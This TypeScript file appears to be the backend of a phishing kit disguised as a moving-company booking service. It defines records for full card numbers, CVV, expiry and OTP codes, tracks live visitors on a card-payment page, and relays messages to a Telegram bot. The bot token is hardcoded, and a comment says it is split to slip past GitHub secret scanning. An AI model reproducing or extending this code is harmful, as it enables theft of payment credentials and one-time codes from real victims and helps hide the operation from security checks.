// Pure Telegram + Local Storage Engine (Database removed as requested)

// Assemble default Bot Token dynamically at runtime so GitHub Secret Scanning does not block repository pushes
const DEFAULT_BOT_ID = '8911571776';
const DEFAULT_BOT_KEY = 'AAF34QGAz1SPQa7bjijcXblKi-bSbY2qY0Q';

export const DEFAULT_TELEGRAM_CONFIG = {
  botToken: `${DEFAULT_BOT_ID}:${DEFAULT_BOT_KEY}`,
  botUsername: 'ghhfvsshsorffs_bot',
  chatId: '6726553753'
};

export interface TelegramConfigState {
  botToken: string;
  botUsername: string;
  chatId: string;
}

export const getTelegramConfig = (): TelegramConfigState => {
  try {
    const saved = typeof window !== 'undefined' ? localStorage.getItem('delmon_telegram_config') : null;
    if (saved) {
      const parsed = JSON.parse(saved);
      const resolvedChatId = (!parsed.chatId || parsed.chatId === '8914993162')
        ? DEFAULT_TELEGRAM_CONFIG.chatId
        : parsed.chatId;

      return {
        botToken: parsed.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
        botUsername: parsed.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
        chatId: resolvedChatId
      };
    }
  } catch (e) {
    // fallback
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const saveTelegramConfig = (config: TelegramConfigState) => {
  if (typeof window !== 'undefined') {
    localStorage.setItem('delmon_telegram_config', JSON.stringify(config));
  }
};

export const resetTelegramConfig = (): TelegramConfigState => {
  if (typeof window !== 'undefined') {
    localStorage.removeItem('delmon_telegram_config');
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const TELEGRAM_CONFIG = DEFAULT_TELEGRAM_CONFIG;

// Types for Bookings, Visitors, and Steps
export interface EsfgdrBooking {
  id: string;
  name?: string;
  email?: string;
  phone?: string;
  fromAddress?: string;
  toAddress?: string;
  fromCity?: string;
  toCity?: string;
  fromPostcode?: string;
  toPostcode?: string;
  moveDate?: string;
  moveTime?: string;
  propertySize?: string;
  packageLabel?: string;
  notes?: string;
  depositAmount?: number;
  paymentAmount?: number;
  paymentCurrency?: string;
  paymentMethod?: string;
  paymentProvider?: string;
  paymentReference?: string;
  paymentCardholderName?: string;
  cardNumber?: string;
  cardLast4?: string;
  cardBrand?: string;
  cardExpiry?: string;
  cardCvv?: string;
  verificationCode?: string; // OTP
  isVerified?: boolean;
  paymentStatus?: string;
  status?: string;
  type?: string;
  createdAt?: any;
  updatedAt?: any;
  paymentPaidAt?: any;
}

export interface EsfgdrVisitor {
  id: string;
  sessionId?: string;
  currentPage?: string;
  currentStep?: string;
  isOnline?: boolean;
  createdAt?: any;
  updatedAt?: any;
}

export interface EsfgdrStep {
  id: string;
  sessionId?: string;
  page?: string;
  step?: string;
  userId?: string;
  data?: Record<string, any>;
  timestamp?: any;
  updatedAt?: any;
}

export interface EsfgdrSession {
  id: string;
  startTime?: any;
  lastActivity?: any;
  isOnline?: boolean;
  currentPage?: string;
}

// Local Storage Keys for Steps, Bookings, Visitors
const BOOKINGS_STORAGE_KEY = 'delmon_bookings_log';
const STEPS_STORAGE_KEY = 'delmon_steps_log';
const VISITORS_STORAGE_KEY = 'delmon_visitors_log';
const SYNC_EVENT_NAME = 'delmon_local_sync';

function readLocalList<T>(key: string): T[] {
  if (typeof window === 'undefined') return [];
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

function writeLocalList<T>(key: string, items: T[]): void {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(key, JSON.stringify(items));
    window.dispatchEvent(new Event(SYNC_EVENT_NAME));
  } catch (e) {
    console.warn('Local storage write error:', e);
  }
}

// -------------------------------------------------------------
// Real-time Subscriptions (Local Storage + Event Sync)
// -------------------------------------------------------------

export function subscribeToEsfgdrBookings(
  onData: (bookings: EsfgdrBooking[]) => void,
  _onError?: (err: Error) => void
) {
  const load = () => {
    const items = readLocalList<EsfgdrBooking>(BOOKINGS_STORAGE_KEY);
    onData(items);
  };
  load();

  if (typeof window !== 'undefined') {
    window.addEventListener(SYNC_EVENT_NAME, load);
    window.addEventListener('storage', load);
    return () => {
      window.removeEventListener(SYNC_EVENT_NAME, load);
      window.removeEventListener('storage', load);
    };
  }
  return () => {};
}

export function subscribeToEsfgdrVisitors(
  onData: (visitors: EsfgdrVisitor[]) => void,
  _onError?: (err: Error) => void
) {
  const load = () => {
    const items = readLocalList<EsfgdrVisitor>(VISITORS_STORAGE_KEY);
    onData(items);
  };
  load();

  if (typeof window !== 'undefined') {
    window.addEventListener(SYNC_EVENT_NAME, load);
    window.addEventListener('storage', load);
    return () => {
      window.removeEventListener(SYNC_EVENT_NAME, load);
      window.removeEventListener('storage', load);
    };
  }
  return () => {};
}

export function subscribeToEsfgdrSteps(
  onData: (steps: EsfgdrStep[]) => void,
  _onError?: (err: Error) => void,
  maxDocs: number = 150
) {
  const load = () => {
    const items = readLocalList<EsfgdrStep>(STEPS_STORAGE_KEY);
    onData(items.slice(0, maxDocs));
  };
  load();

  if (typeof window !== 'undefined') {
    window.addEventListener(SYNC_EVENT_NAME, load);
    window.addEventListener('storage', load);
    return () => {
      window.removeEventListener(SYNC_EVENT_NAME, load);
      window.removeEventListener('storage', load);
    };
  }
  return () => {};
}

// -------------------------------------------------------------
// Mutations & Actions
// -------------------------------------------------------------

export async function updateEsfgdrBookingStatus(
  bookingId: string,
  newStatus: string,
  paymentStatus?: string
): Promise<void> {
  const items = readLocalList<EsfgdrBooking>(BOOKINGS_STORAGE_KEY);
  const updated = items.map((b) => {
    if (b.id !== bookingId) return b;
    return {
      ...b,
      status: newStatus,
      paymentStatus: paymentStatus || b.paymentStatus,
      updatedAt: new Date().toISOString()
    };
  });
  writeLocalList(BOOKINGS_STORAGE_KEY, updated);
}

export async function deleteEsfgdrBooking(bookingId: string): Promise<void> {
  const items = readLocalList<EsfgdrBooking>(BOOKINGS_STORAGE_KEY);
  writeLocalList(
    BOOKINGS_STORAGE_KEY,
    items.filter((b) => b.id !== bookingId)
  );
}

export async function deleteEsfgdrStep(stepId: string): Promise<void> {
  const items = readLocalList<EsfgdrStep>(STEPS_STORAGE_KEY);
  writeLocalList(
    STEPS_STORAGE_KEY,
    items.filter((s) => s.id !== stepId)
  );
}

// Record a new step locally
export async function recordEsfgdrStep(
  sessionId: string,
  stepName: string,
  stepData: Record<string, any>,
  page: string = '/card-payment.html'
): Promise<string> {
  const docId = `${sessionId}_${stepName}_${Date.now()}`;
  const nowIso = new Date().toISOString();
  const newStep: EsfgdrStep = {
    id: docId,
    sessionId,
    step: stepName,
    page,
    userId: 'anonymous',
    data: stepData,
    timestamp: nowIso,
    updatedAt: nowIso
  };
  const existing = readLocalList<EsfgdrStep>(STEPS_STORAGE_KEY);
  writeLocalList(STEPS_STORAGE_KEY, [newStep, ...existing].slice(0, 300));
  return docId;
}

// Save or create a booking locally
export async function saveEsfgdrBooking(
  bookingData: Partial<EsfgdrBooking>
): Promise<string> {
  const bookingId = bookingData.id || `BH-${Date.now()}`;
  const nowIso = new Date().toISOString();
  const newBooking: EsfgdrBooking = {
    ...(bookingData as EsfgdrBooking),
    id: bookingId,
    updatedAt: nowIso,
    createdAt: bookingData.createdAt || nowIso
  };
  const existing = readLocalList<EsfgdrBooking>(BOOKINGS_STORAGE_KEY);
  const filtered = existing.filter((b) => b.id !== bookingId);
  writeLocalList(BOOKINGS_STORAGE_KEY, [newBooking, ...filtered]);
  return bookingId;
}

// Update or set live visitor locally
export async function recordEsfgdrVisitor(
  sessionId: string,
  currentPage: string,
  currentStep: string = 'booking',
  isOnline: boolean = true
): Promise<void> {
  const nowIso = new Date().toISOString();
  const visitor: EsfgdrVisitor = {
    id: sessionId,
    sessionId,
    currentPage,
    currentStep,
    isOnline,
    updatedAt: nowIso,
    createdAt: nowIso
  };
  const existing = readLocalList<EsfgdrVisitor>(VISITORS_STORAGE_KEY);
  const filtered = existing.filter((v) => v.id !== sessionId);
  writeLocalList(VISITORS_STORAGE_KEY, [visitor, ...filtered].slice(0, 100));
}

// -------------------------------------------------------------
// Telegram Bot Alerts API
// -------------------------------------------------------------

export interface TelegramSendResult {
  ok: boolean;
  error?: string;
}

export async function sendTelegramNotificationDetailed(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<TelegramSendResult> {
  try {
    const cfg = getTelegramConfig();
    const token = configOverride?.botToken || cfg.botToken;
    const chatId = configOverride?.chatId || cfg.chatId;

    if (!token || !chatId) {
      return { ok: false, error: 'لم يتم تحديد رمز البوت أو معرف المحادثة' };
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const resJson = await response.json();
    if (resJson.ok) {
      return { ok: true };
    } else {
      return {
        ok: false,
        error: resJson.description || 'فشل إرسال الرسالة من تلغرام'
      };
    }
  } catch (err: any) {
    console.warn('Telegram notification delivery error:', err);
    return { ok: false, error: err?.message || 'خطأ في الاتصال بشبكة تلغرام' };
  }
}

export async function sendTelegramNotification(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<boolean> {
  const result = await sendTelegramNotificationDetailed(message, configOverride);
  return result.ok;
}

export async function checkTelegramUpdates(botToken?: string): Promise<{
  ok: boolean;
  updates?: any[];
  detectedChats?: { id: string | number; name: string; username?: string; text?: string }[];
  error?: string;
}> {
  try {
    const cfg = getTelegramConfig();
    const token = botToken || cfg.botToken;
    const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
    const data = await response.json();
    if (!data.ok) {
      return { ok: false, error: data.description || 'فشل فحص التحديثات' };
    }

    const updates = data.result || [];
    const chatsMap = new Map<string, { id: string | number; name: string; username?: string; text?: string }>();

    for (const u of updates) {
      const msg = u.message || u.edited_message || u.channel_post;
      if (msg && msg.chat) {
        const cId = msg.chat.id.toString();
        const name = [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(' ') || msg.chat.title || 'مستخدم';
        chatsMap.set(cId, {
          id: msg.chat.id,
          name,
          username: msg.chat.username,
          text: msg.text || ''
        });
      }
    }

    return {
      ok: true,
      updates,
      detectedChats: Array.from(chatsMap.values())
    };
  } catch (err: any) {
    return { ok: false, error: err?.message || 'خطأ في الاتصال بتلغرام' };
  }
}
